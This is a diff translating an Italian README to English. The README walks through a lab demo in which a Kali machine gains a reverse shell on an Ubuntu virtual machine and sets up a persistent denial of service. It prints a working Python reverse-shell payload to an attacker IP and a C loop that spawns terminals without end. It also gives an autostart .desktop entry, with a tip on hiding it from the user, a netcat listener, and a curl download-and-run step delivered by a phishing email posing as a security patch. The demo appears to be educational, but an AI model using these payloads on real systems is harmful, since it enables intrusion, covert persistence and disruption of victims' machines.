@@ -5,12 +5,12 @@
 
 ## Introduction
 
-L'obiettivo della demo è di creare un Denial of Service persistente su una macchina virtuale Ubuntu, che quindi sarà la macchina attaccata, mentre per l'attaccante è stata utilizzata una macchina virtuale Kali. Per fare ciò, per prima cosa viene creata una reverse shell per permettere alla macchina attaccante di agire liberamente sulla macchina Ubuntu. 
+The goal of the demo is to create a persistent Denial of Service on an Ubuntu virtual machine, which will therefore be the attacked machine, while a Kali virtual machine was used for the attacker. To do this, a reverse shell is first created to allow the attacking machine to act freely on the Ubuntu machine.
 
-## Preparazione Kali
-Per prima cosa sono stati creati tutti i file necessari su Kali.
-Per primo il file `reverseshell.sh`, dove è presente il [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python 
-```js
+## Kali Preparation
+First of all, all the necessary files were created on Kali.
+First, the `reverseshell.sh` file, where the is the [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python 
+```py
 export RHOST="10.0.2.2";
 export RPORT=4444;
 python3 -c 'import socket,os,pty;
@@ -19,9 +19,9 @@ s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)];
 pty.spawn("/bin/sh")&'
 ```
-che permette di creare una reverse shell in background quando eseguito sulla macchina attaccata.
-Poi, è stato creato un semplicissimo programma in C, `dos.c`, contenente un ciclo while infinito che continua ad aprire finestre di terminale:
-```js
+which allows to create a reverse shell in the background when executed on the attacked machine.
+Then, a very simple C program, `dos.c`, was created, containing an infinite while loop that continues to open terminal windows:
+```c
 #include <stdlib.h>
 int main(){
     while(1){
@@ -30,8 +30,8 @@ int main(){
     return 0;
 }
 ```
-è stato scelto di aprire il terminale per semplicità, è possibile farlo con altre applicazioni e anche aprirne diverse, creando un vero e proprio crash della macchina. 
-Infine è stato creato il file `dos.desktop` 
+The terminal was chosen to be opened for simplicity, it is possible to do it with other applications and also open several of them, creating a real crash of the machine.
+Finally, the `dos.desktop` file was created:
 ```js
 [Desktop Entry]                  
 Type=Application                
@@ -44,19 +44,19 @@ Name=dos
 Comment[eu_US]=
 Comment=
 ```
-che verrà utilizzato per inserire il programma che esegue il Denial of Service tra le applicazioni che si aprono all'avvio della macchina. 
-I flag Hidden e NoDisplay, per evidenziare il Denial of Service, sono stati messi a false, se vengono settati a true, il programma viene eseguito senza che l'utente si accorga di nulla, quindi la macchina viene rallentata senza la riesca a capire il motivo.
-Una volta creati i file, è stata creato anche un web file server sulla porta 80, utilizzando il comando 
+It will be used to insert the program that executes the Denial of Service among the applications that open at the start of the machine.
+The Hidden and NoDisplay flags, to highlight the Denial of Service, have been set to false, if they are set to true, the program runs without the user noticing anything, so the machine is slowed down without being able to understand the reason.
+Once the files were created, a web file server was also created on port 80, using the command.
 `python -m http.server 80`
 
 ![Web File Server](images/webfileserverdemo.png)
 
-A questo punto, l'unica cosa che rimane da fare, è mettersi in ascolto sulla porta predefinita, per fare ciò è stato utilizzato il comando `nc -lvp 4444 -n`
+At this point, the only thing left to do is to listen on the default port, to do this it was used the command: `nc -lvp 4444 -n`
 
 # Reverse shell 
 
-Per creare la reverse shell, è necessario che l'utente sulla macchina attaccata venga convinto a scaricare ed eseguire il file `reverseshell.sh`, questo potrebbe essere fatto creando una mail di phishing e convincendolo, per esempio, che si tratti di una patch di sicurezza. Nella demo, viene utilizzando il comando `curl -O "http://10.0.2.2/demo/reverseshell.sh"`, che scarica il file dal web file server creato su Kali, a questo punto si esegue il comando `sudo chmod +x reverseshell.sh` che aggiunge il permesso di esecuzione al file con privilegi di amministratore, infine viene eseguito il file con `./reverseshell.sh`. 
-A questo punto, essendo la reverse shell eseguita in background, l'utente su Ubuntu può continuare ad utilizzare il terminale normalmente, senza accorgersi di nulla, ma in realtà è connesso sulla porta 4444 alla macchina Kali attraverso una reverse shell.
+To create the reverse shell, it is necessary for the user on the attacked machine to be convinced to download and execute the `reverseshell.sh` file, this could be done by creating a phishing email and convincing him, for example, that it is a security patch. In the demo, the command `curl -O "http://10.0.2.2/demo/reverseshell.sh"` is used, which downloads the file from the web file server created on Kali, at this point the command `sudo chmod +x reverseshell.sh` is executed which adds the execution permission to the file with administrator privileges, finally the file is executed with `./reverseshell.sh`.
+At this point, being the reverse shell executed in the background, the user on Ubuntu can continue to use the terminal normally, without noticing anything, but in reality he is connected on port 4444 to the Kali machine through a reverse shell.
 
 ![Reverse Shell](images/reverseshell.png)
 
